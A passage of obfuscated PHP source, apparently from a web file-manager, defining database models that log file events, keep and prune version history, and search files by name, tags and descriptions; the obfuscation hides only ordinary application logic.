$Ú–ÓÕö’, $ùÖ™µ´¿[2204] => $¿çÎ¦üÏ[$ùÖ™µ´¿[32]], $ùÖ™µ´¿[2180] => !empty($¿çÎ¦üÏ[$ùÖ™µ´¿[582]]) ? $¿çÎ¦üÏ[$ùÖ™µ´¿[582]] : $ùÖ™µ´¿[12], $ùÖ™µ´¿[1235] => $ÒÛğ¨—è, $ùÖ™µ´¿[2205] => $Á¿¸ğú±[$ùÖ™µ´¿[32]], $ùÖ™µ´¿[2206] => !empty($Á¿¸ğú±[$ùÖ™µ´¿[582]]) ? $Á¿¸ğú±[$ùÖ™µ´¿[582]] : $ùÖ™µ´¿[12]); $this->addEvent($Ú¤ÙÎ•¬, $ùÖ™µ´¿[620], $æÚ®ğ€©); $³ƒâş˜ = $µ¨‹«Ïš->sourceInfo($Ú¤ÙÎ•¬); $æÚ®ğ€© = array($ùÖ™µ´¿[193] => $³ƒâş˜[$ùÖ™µ´¿[193]], $ùÖ™µ´¿[32] => $³ƒâş˜[$ùÖ™µ´¿[32]]); $this->addEvent($Ú–ÓÕö’, $ùÖ™µ´¿[2207], $æÚ®ğ€©); } public function eventCopy($±É¦Êí­) { $this->eventCreate($±É¦Êí­, $_SERVER[ˆ¡¹µ‹Â][618]); } public function eventRename($°‡ÒƒÇ, $İÊ¹Á„­, $·Á€Èóæ) { $„ë¼Ì•ı =& $_SERVER[ˆ¡¹µ‹Â]; $½ÖÑç« = array($„ë¼Ì•ı[1234] => $İÊ¹Á„­, $„ë¼Ì•ı[1235] => $·Á€Èóæ); return $this->addEvent($°‡ÒƒÇ, $„ë¼Ì•ı[1425], $½ÖÑç«); } public function eventAddComment($Áêœû÷ì, $ØëÕ¾”Ü) { return $this->addEvent($Áêœû÷ì, $_SERVER[ˆ¡¹µ‹Â][2208], $ØëÕ¾”Ü); } public function eventAddDesc($àâ®Áê¡, $“ºàÚ×) { return $this->addEvent($àâ®Áê¡, $_SERVER[ˆ¡¹µ‹Â][2209], $“ºàÚ×); } public function listBySource($İ“ˆ‰˜) { $í–½€Ìø =& $_SERVER[ˆ¡¹µ‹Â]; $şŞ¨úúÜ = Model($í–½€Ìø[1411])->sourceInfo($İ“ˆ‰˜); $²ë¢‚ª² = array($í–½€Ìø[491] => $İ“ˆ‰˜); if ($şŞ¨úúÜ[$í–½€Ìø[485]] == $í–½€Ìø[91]) { $ñ«ùµÔÆ = Model($í–½€Ìø[1411])->listSearchChildren($İ“ˆ‰˜, 20000); $ñ«ùµÔÆ[] = $İ“ˆ‰˜ . $í–½€Ìø[454]; $²ë¢‚ª² = array($í–½€Ìø[193] => array($í–½€Ìø[7], $ñ«ùµÔÆ)); } $²¡É‹ñ = $this->where($²ë¢‚ª²)->order($í–½€Ìø[2210])->selectPage(); if ($²¡É‹ñ[$í–½€Ìø[442]][$í–½€Ìø[443]] == 0) { $²¡É‹ñ[$í–½€Ìø[442]][$í–½€Ìø[443]] = 1; $²¡É‹ñ[$í–½€Ìø[445]] = array(array($í–½€Ìø[491] => $İ“ˆ‰˜, $í–½€Ìø[2190] => $şŞ¨úúÜ[$í–½€Ìø[192]], $í–½€Ìø[1754] => $şŞ¨úúÜ[$í–½€Ìø[527]], $í–½€Ìø[496] => $í–½€Ìø[2211], $í–½€Ìø[497] => $şŞ¨úúÜ[$í–½€Ìø[231]], $í–½€Ìø[1756] => $í–½€Ìø[12])); } return $this->eventListParse($²¡É‹ñ, $İ“ˆ‰˜); } private function eventListParse($ÌÃ®›ÊŸ, $½ŒşŒ¾ú) { $˜½êÁ‡ƒ =& $_SERVER[ˆ¡¹µ‹Â]; $‚ƒ±é‰š = $ÌÃ®›ÊŸ[$˜½êÁ‡ƒ[445]]; $¦ËÄÌ« = array_to_keyvalue($‚ƒ±é‰š, $˜½êÁ‡ƒ[12], $˜½êÁ‡ƒ[193]); $¢£®ñí¸ = array_to_keyvalue($‚ƒ±é‰š, $˜½êÁ‡ƒ[12], $˜½êÁ‡ƒ[2196]); foreach ($‚ƒ±é‰š as $Óî¿¯ëÀ) { $“ÀƒŒ²ë = $Óî¿¯ëÀ[$˜½êÁ‡ƒ[526]]; if ($Óî¿¯ëÀ[$˜½êÁ‡ƒ[33]] == $˜½êÁ‡ƒ[620] && isset($“ÀƒŒ²ë[$˜½êÁ‡ƒ[1234]])) { $¦ËÄÌ«[] = $“ÀƒŒ²ë[$˜½êÁ‡ƒ[1234]] . $˜½êÁ‡ƒ[12]; $¦ËÄÌ«[] = $“ÀƒŒ²ë[$˜½êÁ‡ƒ[1235]] . $˜½êÁ‡ƒ[12]; } if ($Óî¿¯ëÀ[$˜½êÁ‡ƒ[33]] == $˜½êÁ‡ƒ[2207] && isset($“ÀƒŒ²ë[$˜½êÁ‡ƒ[193]])) { $¦ËÄÌ«[] = $“ÀƒŒ²ë[$˜½êÁ‡ƒ[193]] . $˜½êÁ‡ƒ[12]; } } $¦ËÄÌ« = array_merge($¦ËÄÌ«, $¢£®ñí¸, array($½ŒşŒ¾ú . $˜½êÁ‡ƒ[12])); $¦ËÄÌ« = array_unique($¦ËÄÌ«); $ÚÛÄ¼Ï = array_unique(array_to_keyvalue($‚ƒ±é‰š, $˜½êÁ‡ƒ[12], $˜½êÁ‡ƒ[1763])); $åäµÀğ¥ = Model($˜½êÁ‡ƒ[598])->userListInfo($ÚÛÄ¼Ï); $«™ÍŞÜœ = Model($˜½êÁ‡ƒ[899])->sourceListInfo($¦ËÄÌ«, !0); foreach ($‚ƒ±é‰š as &$Óî¿¯ëÀ) { if ($Óî¿¯ëÀ[$˜½êÁ‡ƒ[33]] == $˜½êÁ‡ƒ[620] && isset($Óî¿¯ëÀ[$˜½êÁ‡ƒ[526]][$˜½êÁ‡ƒ[1234]])) { $Óî¿¯ëÀ[$˜½êÁ‡ƒ[526]][$˜½êÁ‡ƒ[1234]] = $«™ÍŞÜœ[$Óî¿¯ëÀ[$˜½êÁ‡ƒ[526]][$˜½êÁ‡ƒ[1234]]]; $Óî¿¯ëÀ[$˜½êÁ‡ƒ[526]][$˜½êÁ‡ƒ[1235]] = $«™ÍŞÜœ[$Óî¿¯ëÀ[$˜½êÁ‡ƒ[526]][$˜½êÁ‡ƒ[1235]]]; } if ($Óî¿¯ëÀ[$˜½êÁ‡ƒ[33]] == $˜½êÁ‡ƒ[2207] && isset($Óî¿¯ëÀ[$˜½êÁ‡ƒ[526]][$˜½êÁ‡ƒ[193]])) { $Óî¿¯ëÀ[$˜½êÁ‡ƒ[526]][$˜½êÁ‡ƒ[193]] = $«™ÍŞÜœ[$Óî¿¯ëÀ[$˜½êÁ‡ƒ[526]][$˜½êÁ‡ƒ[193]]]; } $Óî¿¯ëÀ[$˜½êÁ‡ƒ[90]] = $«™ÍŞÜœ[$Óî¿¯ëÀ[$˜½êÁ‡ƒ[193]]]; $Óî¿¯ëÀ[$˜½êÁ‡ƒ[2212]] = $«™ÍŞÜœ[$Óî¿¯ëÀ[$˜½êÁ‡ƒ[2196]]]; if ($Óî¿¯ëÀ[$˜½êÁ‡ƒ[33]] == $˜½êÁ‡ƒ[1930]) { $Óî¿¯ëÀ[$˜½êÁ‡ƒ[2212]] = $Óî¿¯ëÀ[$˜½êÁ‡ƒ[90]]; $Óî¿¯ëÀ[$˜½êÁ‡ƒ[2196]] = $Óî¿¯ëÀ[$˜½êÁ‡ƒ[2212]][$˜½êÁ‡ƒ[193]]; $Óî¿¯ëÀ[$˜½êÁ‡ƒ[90]] = !1; $Óî¿¯ëÀ[$˜½êÁ‡ƒ[193]] = $˜½êÁ‡ƒ[12]; } $Óî¿¯ëÀ[$˜½êÁ‡ƒ[2139]] = $åäµÀğ¥[$Óî¿¯ëÀ[$˜½êÁ‡ƒ[1763]]]; } unset($Óî¿¯ëÀ); $ÌÃ®›ÊŸ[$˜½êÁ‡ƒ[445]] = $‚ƒ±é‰š; return $ÌÃ®›ÊŸ; } public function removeBySource($ÃºìÎ“È) { $¢ê­ä¾á = array($_SERVER[ˆ¡¹µ‹Â][491] => $ÃºìÎ“È); $this->where($¢ê­ä¾á)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\162\x63\x65\x5f\150\x69\x73\164\157\x72\x79"; public function historyCount($§ğ¨¡¶Â) { $÷®»­¿‹ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$§ğ¨¡¶Â) { return array(); } if (is_string($§ğ¨¡¶Â) || is_int($§ğ¨¡¶Â)) { $§ğ¨¡¶Â = array($§ğ¨¡¶Â); } $Ãò•ïûÒ = array($÷®»­¿‹[193], $÷®»­¿‹[1995] => $÷®»­¿‹[565]); $¨üûò…ñ = array($÷®»­¿‹[193] => array($÷®»­¿‹[7], $§ğ¨¡¶Â)); $ÇîÀÑõ = $this->field($Ãò•ïûÒ)->where($¨üûò…ñ)->group($÷®»­¿‹[193])->select(); return array_to_keyvalue($ÇîÀÑõ, $÷®»­¿‹[193], $÷®»­¿‹[565]); } public function addHistory($Í»íçù, $Ô§ŒóĞí = '') { $âÈŞ‰ô‚ =& $_SERVER[ˆ¡¹µ‹Â]; $¾ÜÛ¿å’ = array($âÈŞ‰ô‚[491] => $Í»íçù[$âÈŞ‰ô‚[193]], $âÈŞ‰ô‚[1754] => isset($Í»íçù[$âÈŞ‰ô‚[529]]) ? $Í»íçù[$âÈŞ‰ô‚[529]] : $Í»íçù[$âÈŞ‰ô‚[527]], $âÈŞ‰ô‚[542] => $Í»íçù[$âÈŞ‰ô‚[541]], $âÈŞ‰ô‚[617] => $Í»íçù[$âÈŞ‰ô‚[79]], $âÈŞ‰ô‚[2213] => $Ô§ŒóĞí); if ($GLOBALS[$âÈŞ‰ô‚[6]][$âÈŞ‰ô‚[92]][$âÈŞ‰ô‚[1295]] >= 1) { $this->historyAutoClear($¾ÜÛ¿å’[$âÈŞ‰ô‚[193]]); $this->add($¾ÜÛ¿å’); } Hook::trigger($âÈŞ‰ô‚[2214], $¾ÜÛ¿å’); Model($âÈŞ‰ô‚[2215])->eventFileEdit($Í»íçù[$âÈŞ‰ô‚[193]]); } private function historyAutoClear($¿å•Áä¾) { $ÁåÔÏÚ¦ =& $_SERVER[ˆ¡¹µ‹Â]; $Óâ±ºÜ = Model($ÁåÔÏÚ¦[837])->get($ÁåÔÏÚ¦[1317]); $ªô‚úóÉ = intval($GLOBALS[$ÁåÔÏÚ¦[6]][$ÁåÔÏÚ¦[92]][$ÁåÔÏÚ¦[1295]]); $Æ“ÅÑ = $Óâ±ºÜ == $ÁåÔÏÚ¦[1318] ? min(5, $ªô‚úóÉ) : $ªô‚úóÉ; $Æ“ÅÑ = $Æ“ÅÑ <= 0 ? 0 : $Æ“ÅÑ - 1; if ($Æ“ÅÑ >= 499) { return; } $ßÛÂ¾éı = array($ÁåÔÏÚ¦[491] => $¿å•Áä¾); $Ë‡‚ûş = $this->field($ÁåÔÏÚ¦[2216])->where($ßÛÂ¾éı)->order($ÁåÔÏÚ¦[2210])->select(); if (!$Ë‡‚ûş || $Æ“ÅÑ >= count($Ë‡‚ûş)) { return; } $¢°¸áàµ = array_to_keyvalue($Ë‡‚ûş, $ÁåÔÏÚ¦[12], $ÁåÔÏÚ¦[475]); $¢°¸áàµ = array_slice($¢°¸áàµ, $Æ“ÅÑ); $”Äû†ƒ = array_to_keyvalue($Ë‡‚ûş, $ÁåÔÏÚ¦[12], $ÁåÔÏÚ¦[541]); $”Äû†ƒ = array_slice($”Äû†ƒ, $Æ“ÅÑ); if (!$¢°¸áàµ || !$”Äû†ƒ) { return; } $ßÛÂ¾éı = array($ÁåÔÏÚ¦[493] => array($ÁåÔÏÚ¦[7], $¢°¸áàµ)); $this->where($ßÛÂ¾éı)->delete(); Model($ÁåÔÏÚ¦[544])->remove($”Äû†ƒ); } public function listData($üˆÏÀİô) { $á·€çı =& $_SERVER[ˆ¡¹µ‹Â]; $Í×¤­ƒ = array($á·€çı[491] => $üˆÏÀİô); $÷üóªÊì = $á·€çı[2217]; $Á¯ıÆ‚‹ = $this->field($÷üóªÊì)->where($Í×¤­ƒ)->order($á·€çı[2210])->selectPage(); $this->_listAppendUser($Á¯ıÆ‚‹[$á·€çı[445]]); $ÔıÂÛ”· = Model($á·€çı[837])->get($á·€çı[1317]); $…±¹ö÷ = 5; if ($ÔıÂÛ”· == $á·€çı[1318]) { $Á¯ıÆ‚‹[$á·€çı[445]] = array_slice($Á¯ıÆ‚‹[$á·€çı[445]], 0, $…±¹ö÷); $Á¯ıÆ‚‹[$á·€çı[442]] = array($á·€çı[2218] => 1, $á·€çı[2219] => 20, $á·€çı[2220] => 1, $á·€çı[2221] => count($Á¯ıÆ‚‹[$á·€çı[445]])); } return $Á¯ıÆ‚‹; } protected function _listAppendUser(&$ø¤Ì‘ı) { $¤ï¹§– =& $_SERVER[ˆ¡¹µ‹Â]; $æ™ãİ–Ù = array_to_keyvalue($ø¤Ì‘ı, $¤ï¹§–[12], $¤ï¹§–[1763]); $ñØèœÎ³ = Model($¤ï¹§–[598])->userListInfo($æ™ãİ–Ù); foreach ($ø¤Ì‘ı as &$Ç½ÆÈ“ú) { $Ä¯»Îøö = $Ç½ÆÈ“ú[$¤ï¹§–[1763]]; $Ç½ÆÈ“ú[$¤ï¹§–[527]] = $ñØèœÎ³[$Ä¯»Îøö] ? $ñØèœÎ³[$Ä¯»Îøö] : !1; } unset($Ç½ÆÈ“ú); } public function fileInfo($²éÑ¶–é) { $–¥³ØÇÚ =& $_SERVER[ˆ¡¹µ‹Â]; $ï”‘İòŞ = $this->tablePrefix; $™®°ç™Ø = "{$ï”‘İòŞ}\x69\x6f\137\146\x69\154\x65\x20\x66\x69\x6c\x65\163\40\157\156\x20\146\x69\x6c\145\x73\56\146\x69\154\x65\x49\104\x20\75\x20\x68\151\163\x74\x6f\x72\171\x2e\x66\x69\x6c\x65\111\x44"; return $this->alias($–¥³ØÇÚ[2222])->where(array($–¥³ØÇÚ[493] => $²éÑ¶–é))->join($™®°ç™Ø, $–¥³ØÇÚ[2223])->find(); } public function removeItem($ŞÂ–Òˆä) { $½¨Äİ¹õ =& $_SERVER[ˆ¡¹µ‹Â]; $´£ô÷ = array($½¨Äİ¹õ[493] => $ŞÂ–Òˆä); $¼Óó¶ = $this->where($´£ô÷)->find(); if ($¼Óó¶) { $òáÁ¶É = $this->where($´£ô÷)->delete(); Model($½¨Äİ¹õ[544])->remove($¼Óó¶[$½¨Äİ¹õ[541]]); return $òáÁ¶É; } return !1; } public function removeBySource($ÉŠäú¤) { $Ö€ â€Š =& $_SERVER[ˆ¡¹µ‹Â]; if (!$ÉŠäú¤) { return !1; } if (!is_array($ÉŠäú¤)) { $ÉŠäú¤ = array($ÉŠäú¤); } $Îøû¥İù = array($Ö€ â€Š[491] => array($Ö€ â€Š[7], $ÉŠäú¤)); $¥œøÕê• = $this->field($Ö€ â€Š[542])->where($Îøû¥İù)->select(); if ($¥œøÕê•) { $this->where($Îøû¥İù)->delete(); $ÕâáÌŞŒ = array_to_keyvalue($¥œøÕê•, $Ö€ â€Š[12], $Ö€ â€Š[541]); Model($Ö€ â€Š[544])->remove($ÕâáÌŞŒ); } return !0; } public function setDetail($™’¢÷Õ , $øˆô²ÒÍ) { $ …Àé =& $_SERVER[ˆ¡¹µ‹Â]; return $this->where(array($ …Àé[493] => $™’¢÷Õ ))->save(array($ …Àé[2213] => $øˆô²ÒÍ)); } public function rollbackToItem($ß¢óˆˆö, $íÍÍ“÷†) { $‡»ë™·Å =& $_SERVER[ˆ¡¹µ‹Â]; $ı™·ìƒï = Model($‡»ë™·Å[899])->sourceInfo($ß¢óˆˆö); $this->addHistory($ı™·ìƒï, LNG($‡»ë™·Å[2224])); $»œ¡Ä÷ = $this->find($íÍÍ“÷†); $ƒµÈêÀØ = array($‡»ë™·Å[541] => $»œ¡Ä÷[$‡»ë™·Å[541]], $‡»ë™·Å[79] => $»œ¡Ä÷[$‡»ë™·Å[79]], $‡»ë™·Å[88] => time(), $‡»ë™·Å[529] => USER_ID); Model($‡»ë™·Å[899])->where(array($‡»ë™·Å[193] => $ß¢óˆˆö))->save($ƒµÈêÀØ); return $this->where(array($‡»ë™·Å[493] => $íÍÍ“÷†))->delete(); } public function clearSame($Ê°ÙîŞª) { $Çâ¢¿›£ =& $_SERVER[ˆ¡¹µ‹Â]; $ûäæ²ªü = $this->listData($Ê°ÙîŞª); $Üğ†°Ó = array_to_keyvalue_group($ûäæ²ªü, $Çâ¢¿›£[541]); $ò×Ô’Ç = array(); $ÃÎÄãÙ¨ = array(); foreach ($Üğ†°Ó as $ØêÚÖÕ¬) { if (!$ØêÚÖÕ¬ || count($ØêÚÖÕ¬) <= 1) { continue; } foreach ($ØêÚÖÕ¬ as $ªë¿õú) { $ò×Ô’Ç[] = $ªë¿õú[$Çâ¢¿›£[541]]; $ÃÎÄãÙ¨[] = $ªë¿õú[$Çâ¢¿›£[475]]; } } if (!$ÃÎÄãÙ¨) { return; } $this->where(array($Çâ¢¿›£[475] => array($Çâ¢¿›£[7], $ÃÎÄãÙ¨)))->delete(); Model($Çâ¢¿›£[544])->remove($ò×Ô’Ç); } public function userSpace() { $ƒ“¥Š¾Ú =& $_SERVER[ˆ¡¹µ‹Â]; $Æô²§†Ÿ = $this->tablePrefix; $Á›´ôøˆ = array($ƒ“¥Š¾Ú[1754] => USER_ID); $ğÍ†æéˆ = "{$Æô²§†Ÿ}\151\x6f\137\146\151\x6c\145\x20\146\151\154\x65\163\40\x6f\156\40\x66\151\154\145\163\x2e\146\x69\x6c\x65\x49\x44\40\x3d\40\x68\x69\x73\x74\x6f\162\x79\x2e\146\151\154\145\x49\104"; return $this->alias($ƒ“¥Š¾Ú[2222])->where($Á›´ôøˆ)->join($ğÍ†æéˆ, $ƒ“¥Š¾Ú[2223])->sum($ƒ“¥Š¾Ú[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($—Ã‡à“”) { $”ÛØÌ¹ =& $_SERVER[ˆ¡¹µ‹Â]; $¦’Ú¶‹ = KodIO::fileTypeList(); $çÄ™» á = $¦’Ú¶‹[$—Ã‡à“”]; if (!$çÄ™» á) { return array(); } $¥ŸÕİ÷± = $çÄ™» á[$”ÛØÌ¹[169]]; $ øÛ¿©ğ = $”ÛØÌ¹[7]; if (!$çÄ™» á[$”ÛØÌ¹[169]]) { $òå†Ú  = array_to_keyvalue($¦’Ú¶‹, $”ÛØÌ¹[12], $”ÛØÌ¹[169]); $¥ŸÕİ÷± = implode($”ÛØÌ¹[50], $òå†Ú ); $ øÛ¿©ğ = $”ÛØÌ¹[2225]; } $¬Şëù¬ = explode($”ÛØÌ¹[50], trim($¥ŸÕİ÷±, $”ÛØÌ¹[50])); return array($ øÛ¿©ğ, $¬Şëù¬); } public function listPathType($¤š€°ğÕ) { $¤®ªÆø« =& $_SERVER[ˆ¡¹µ‹Â]; $¶’óùÜ• = $this->fileTypeWhere($¤š€°ğÕ); if (!$¶’óùÜ•) { return array(); } $÷™µ–Ü = USER_ID; $™ø©ÁÃè = Model($¤®ªÆø«[598])->getInfo($÷™µ–Ü); $Î÷îÅß = array($¤®ªÆø«[648] => SourceModel::TYPE_USER, $¤®ªÆø«[584] => array($¤®ªÆø«[612], $¤®ªÆø«[594] . $™ø©ÁÃè[$¤®ªÆø«[90]][$¤®ªÆø«[193]] . $¤®ªÆø«[613]), $¤®ªÆø«[649] => $÷™µ–Ü, $¤®ªÆø«[646] => 0, $¤®ªÆø«[647] => $¶’óùÜ•); return $this->listSource($Î÷îÅß); } public function listSearch($ÏË­ı†š, $×½—ûø = 300) { $òôÃÊ®¤ =& $_SERVER[ˆ¡¹µ‹Â]; if (isset($ÏË­ı†š[$òôÃÊ®¤[2060]]) && $ÏË­ı†š[$òôÃÊ®¤[2060]]) { $ÏË­ı†š[$òôÃÊ®¤[2060]] = str_replace($òôÃÊ®¤[460], $òôÃÊ®¤[2226], trim($ÏË­ı†š[$òôÃÊ®¤[2060]])); } $û©èÊ´ = $this->_parseSearchWhere($ÏË­ı†š); if (!isset($û©èÊ´[$òôÃÊ®¤[505]])) { $û©èÊ´[$òôÃÊ®¤[505]] = 0; } $´È‚¥¼õ = $òôÃÊ®¤[2227]; $¬½Ø¹Ë¼ = $û©èÊ´; $’Ë‚ê‚Ë = $´È‚¥¼õ; $this->_listSearchBindPinyin($ÏË­ı†š, $û©èÊ´, $´È‚¥¼õ); $this->alias($òôÃÊ®¤[519])->_makeOrder(); $û©èÊ´ = $this->parseWhereLike($û©èÊ´); $ƒë•©›Ú = $this->distinct(!0)->field($´È‚¥¼õ)->where($û©èÊ´)->selectPage($×½—ûø); if ($GLOBALS[$òôÃÊ®¤[6]][$òôÃÊ®¤[457]][$òôÃÊ®¤[458]] && Input::check($ÏË­ı†š[$òôÃÊ®¤[2060]], $òôÃÊ®¤[655]) && $ƒë•©›Ú[$òôÃÊ®¤[442]][$òôÃÊ®¤[429]] == 1 && $ƒë•©›Ú[$òôÃÊ®¤[442]][$òôÃÊ®¤[443]] == 0) { $ƒë•©›Ú = $this->distinct(!0)->field($´È‚¥¼õ)->where($¬½Ø¹Ë¼)->limit(1000)->select(); $ƒë•©›Ú = array_page_split($ƒë•©›Ú, !1, $×½—ûø); } $this->_listSearchFileContent($ƒë•©›Ú, $ÏË­ı†š, $’Ë‚ê‚Ë, $¬½Ø¹Ë¼); $this->_listSearchDesc($ƒë•©›Ú, $ÏË­ı†š, $’Ë‚ê‚Ë); $this->_listSearchTag($ƒë•©›Ú, $ÏË­ı†š, $’Ë‚ê‚Ë); $this->_listSearchGroupTag($ƒë•©›Ú, $ÏË­ı†š, $’Ë‚ê‚Ë); $this->_listDataApply($ƒë•©›Ú[$òôÃÊ®¤[445]]); $this->_listMake($ƒë•©›Ú); return $ƒë•©›Ú; } private function _listSearchFileContent(&$³ĞÈşŸ, $“ê¿Ôèõ, $Ìñâ®å¦, $¼ØÄÜ“Ë) { $£ú„ùÌ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$“ê¿Ôèõ[$£ú„ùÌ[2060]] || $³ĞÈşŸ[$£ú„ùÌ[442]][$£ú„ùÌ[429]] > 1) { return; } if (!isset($¼ØÄÜ“Ë[$£ú„ùÌ[32]]) || !is_array($“ê¿Ôèõ[$£ú„ùÌ[541]])) { return; } $¼ØÄÜ“Ë[$£ú„ùÌ[541]] = array($£ú„ùÌ[7], $“ê¿Ôèõ[$£ú„ùÌ[541]]); unset($¼ØÄÜ“Ë[$£ú„ùÌ[32]]); unset($“ê¿Ôèõ[$£ú„ùÌ[541]]); $Ø¶Ñ±óğ = $this->field($Ìñâ®å¦)->where($¼ØÄÜ“Ë)->limit($£ú„ùÌ[2228])->select(); if (!$Ø¶Ñ±óğ || count($Ø¶Ñ±óğ) == 0) { return; } $³ĞÈşŸ[$£ú„ùÌ[445]] = array_merge($Ø¶Ñ±óğ, $³ĞÈşŸ[$£ú„ùÌ[445]]); $³ĞÈşŸ[$£ú„ùÌ[442]][$£ú„ùÌ[443]] += count($Ø¶Ñ±óğ); } private function _listSearchTag(&$•àÒô¹£, $§Ö¨¸È³, $£—¨§¥µ) { $‡ôõÍÔ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$§Ö¨¸È³[$‡ôõÍÔ[2060]] || $•àÒô¹£[$‡ôõÍÔ[442]][$‡ôõÍÔ[429]] > 1) { return; } $êÎ¿šÕ± = Model($‡ôõÍÔ[2229])->listData(); $¶ú˜‚éê = array(); $óúæÙĞó = $§Ö¨¸È³[$‡ôõÍÔ[2060]]; foreach ($êÎ¿šÕ± as $ÆÈ±¬¹) { $İÓ÷Ï·Õ = $ÆÈ±¬¹[$‡ôõÍÔ[32]]; $Á·×¾­‘ = str_replace($‡ôõÍÔ[53], $‡ôõÍÔ[12], Pinyin::get($İÓ÷Ï·Õ)); if (stripos($İÓ÷Ï·Õ, $óúæÙĞó) !== !1 || stripos($Á·×¾­‘, $óúæÙĞó) !== !1) { $¶ú˜‚éê[] = $ÆÈ±¬¹[$‡ôõÍÔ[475]]; } } if (!$¶ú˜‚éê) { return; } $‚À—Ş©˜ = array($‡ôõÍÔ[500] => array($‡ôõÍÔ[7], $¶ú˜‚éê), $‡ôõÍÔ[1763] => USER_ID); $Ÿ‘ëñâŒ = Model($‡ôõÍÔ[502])->field($‡ôõÍÔ[87])->where($‚À—Ş©˜)->select(); $Ÿ‘ëñâŒ = array_to_keyvalue($Ÿ‘ëñâŒ, $‡ôõÍÔ[12], $‡ôõÍÔ[87]); $ù¶Äãš = array_unique($Ÿ‘ëñâŒ); $this->_listSearchMerge($•àÒô¹£, $§Ö¨¸È³, $£—¨§¥µ, $ù¶Äãš); } private function _listSearchDesc(&$½€Ø¾Ôú, $®‡÷´ôÒ, $íªÅã¦ù) { $·ó³Äêâ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$®‡÷´ôÒ[$·ó³Äêâ[2060]] || $½€Ø¾Ôú[$·ó³Äêâ[442]][$·ó³Äêâ[429]] > 1) { return; } $Ì«¿ÊÍ = array($·ó³Äêâ[97] => $·ó³Äêâ[526], $·ó³Äêâ[450] => array($·ó³Äêâ[459], $·ó³Äêâ[2062] . $®‡÷´ôÒ[$·ó³Äêâ[2060]] . $·ó³Äêâ[2062])); $€¬â‚÷÷ = !1; if ($€¬â‚÷÷) { $¹Ğìš“Ó = $this->listSearchChildren($®‡÷´ôÒ[$·ó³Äêâ[192]]); $¹Ğìš“Ó = array_unique($¹Ğìš“Ó); if (!$¹Ğìš“Ó) { return; } $Ì«¿ÊÍ[$·ó³Äêâ[193]] = array($·ó³Äêâ[7], $¹Ğìš“Ó); } $şßÑÌÂº = Model($·ó³Äêâ[632])->field($·ó³Äêâ[193])->where($Ì«¿ÊÍ)->limit(5000)->select(); $×ıåè—ñ = array_to_keyvalue($şßÑÌÂº, $·ó³Äêâ[12], $·ó³Äêâ[193]); $this->_listSearchMerge($½€Ø¾Ôú, $®‡÷´ôÒ, $íªÅã¦ù, $×ıåè—ñ); } private function _listSearchGroupTag(&$õÙ‘ôŠ, $åİÌ´°¬, $¡í³½á£) { $ÑŒ¹´¿ı =& $_SERVER[ˆ¡¹µ‹Â]; if (!$åİÌ´°¬[$ÑŒ¹´¿ı[2060]] || $õÙ‘ôŠ[$ÑŒ¹´¿ı[442]][$ÑŒ¹´¿ı[429]] > 1 || !$åİÌ´°¬[$ÑŒ¹´¿ı[192]]) { return; } $‡ êĞÄ„ = $this->sourceInfo($åİÌ´°¬[$ÑŒ¹´¿ı[192]]); if (!$‡ êĞÄ„ || $‡ êĞÄ„[$ÑŒ¹´¿ı[190]] != SourceModel::TYPE_GROUP) { return; } $€ÖõÚó = $‡ êĞÄ„[$ÑŒ¹´¿ı[569]]; $çÈ§üãÇ = Model($ÑŒ¹´¿ı[2230])->get($€ÖõÚó); $ƒÊÒÆÉÁ = array(); $êëÍ ‡« = $åİÌ´°¬[$ÑŒ¹´¿ı[2060]]; foreach ($çÈ§üãÇ[$ÑŒ¹´¿ı[445]] as $ûÅÏ®ä”) { $«Õ„Ä°‡ = $ûÅÏ®ä”[$ÑŒ¹´¿ı[32]]; $¸ºîä©Œ = str_replace($ÑŒ¹´¿ı[53], $ÑŒ¹´¿ı[12], Pinyin::get($«Õ„Ä°‡)); if (stripos($«Õ„Ä°‡, $êëÍ ‡«) !== !1 || stripos($¸ºîä©Œ, $êëÍ ‡«) !== !1) { $ƒÊÒÆÉÁ[] = $ûÅÏ®ä”[$ÑŒ¹´¿ı[475]]; } } if (!$ƒÊÒÆÉÁ) { return; } $âÍãß…¥ = array($ÑŒ¹´¿ı[500] => array($ÑŒ¹´¿ı[7], $ƒÊÒÆÉÁ), $ÑŒ¹´¿ı[1763] => 0, $ÑŒ¹´¿ı[33] => $ÑŒ¹´¿ı[2082] . $€ÖõÚó); $ëİ¶ñ×€ = Model($ÑŒ¹´¿ı[502])->field($ÑŒ¹´¿ı[87])->where($âÍãß…¥)->select(); $ëİ¶ñ×€ = array_to_keyvalue($ëİ¶ñ×€, $ÑŒ¹´¿ı[12], $ÑŒ¹´¿ı[87]); $¢±ãàØ = array_unique($ëİ¶ñ×€); $this->_listSearchMerge($õÙ‘ôŠ, $åİÌ´°¬, $¡í³½á£, $¢±ãàØ); } private function _listSearchMerge(&$¼Ã‹Â·õ, $ÑõÍèä›, $‹Ë„èÎ¬, $‚¯ò÷œÂ) { $öéÎæ  =& $_SERVER[ˆ¡¹µ‹Â]; if (!$‚¯ò÷œÂ) { return; } $ïÄÓÌÍ = array_to_keyvalue($¼Ã‹Â·õ[$öéÎæ [445]], $öéÎæ [12], $öéÎæ [193]); $–ßêáû‘ = array_diff($‚¯ò÷œÂ, $ïÄÓÌÍ); if (!$–ßêáû‘) { return; } $†Ö€É « = array($öéÎæ [193] => array($öéÎæ [7], $–ßêáû‘)); $¾è›Ô„â = $this->field($‹Ë„èÎ¬)->where($†Ö€É «)->select(); if (!$¾è›Ô„â) { return; } $ı İİÒ¿ = array(); foreach ($¾è›Ô„â as $œØÒƒºµ) { if ($this->_listSearchFilter($œØÒƒºµ, $ÑõÍèä›)) { $ı İİÒ¿[] = $œØÒƒºµ; } } $¼Ã‹Â·õ[$öéÎæ [445]] = array_merge($ı İİÒ¿, $¼Ã‹Â·õ[$öéÎæ [445]]); $¼Ã‹Â·õ[$öéÎæ [442]][$öéÎæ [443]] += count($ı İİÒ¿); } private function _listSearchFilter($ï¿‚ª¿—, $¡„îìòá) { $Ş“ğ³ç» =& $_SERVER[ˆ¡¹µ‹Â]; $’±²ŠÁ = $ï¿‚ª¿—[$Ş“ğ³ç»[485]] == $Ş“ğ³ç»[91]; if (!strstr($ï¿‚ª¿—[$Ş“ğ³ç»[584]], $Ş“ğ³ç»[50] . 